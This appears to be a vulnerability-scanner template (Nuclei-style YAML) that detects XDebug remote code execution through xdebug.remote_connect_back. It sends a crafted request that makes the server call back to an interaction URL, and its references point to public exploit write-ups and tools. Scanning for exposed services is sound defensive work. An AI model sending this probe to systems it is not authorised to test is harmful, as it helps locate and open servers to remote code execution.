http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: header
    type: word
    words:
    - 'Set-Cookie: XDEBUG_SESSION={{randstr}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /?XDEBUG_SESSION_START={{randstr}} HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-For: {{interactsh-url}}

    '
id: php-xdebug-rce
info:
  author: pwnhxl
  description: "The XDebug extension <= v2.6.0 for PHP is designed to expand the debugging\
    \ capabilities of developers, including the ability to perform remote debugging.\
    \ A misconfigured server, with \u2018xdebug.remote_connect_back\u2019 enabled,\
    \ exposed to the internet could allow an unauthenticated remote attacker to trigger\
    \ a debugging session using any IP via a simple web request. With a remote debugging\
    \ session established, the attacker effectively has remote code execution (RCE)\
    \ capabilities with which to establish persistence, exfiltrate data, or launch\
    \ further attacks against the system or network.\n"
  metadata:
    max-request: 1
  name: Xdebug remote code execution via xdebug.remote_connect_back
  reference:
  - https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce
  - https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/
  - https://paper.seebug.org/397/
  - https://github.com/D3Ext/XDEBUG-Exploit
  severity: high
  tags: oast,rce,vulhub,php,debug,xdebug,intrusive
